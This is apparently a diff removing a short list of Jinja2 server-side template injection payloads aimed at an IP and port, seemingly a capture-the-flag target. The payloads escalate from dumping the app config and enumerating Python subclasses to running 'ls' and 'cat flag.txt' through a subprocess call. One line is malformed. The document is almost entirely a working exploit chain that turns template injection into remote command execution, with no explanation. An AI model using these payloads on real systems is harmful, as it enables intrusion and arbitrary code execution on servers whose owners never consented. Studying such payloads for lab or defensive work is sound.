@@ -1,9 +1,0 @@
-http://144.126.206.60:30628/{{config.items()}}
-
-http://144.126.206.60:30628/{{"".__class__.__mro__[1].__subclasses__()}}
-
-http://144.126.206.60:30628/{{"".__class__.__mro__[1].__subclasses__()[414}}
-
-http://144.126.206.60:30628/{{"".__class__.__mro__[1].__subclasses__()[414]("ls",shell=True,stdout=-1).communicate()}}
-
-http://144.126.206.60:30628/{{"".__class__.__mro__[1].__subclasses__()[414]("cat flag.txt",shell=True,stdout=-1).communicate()}}
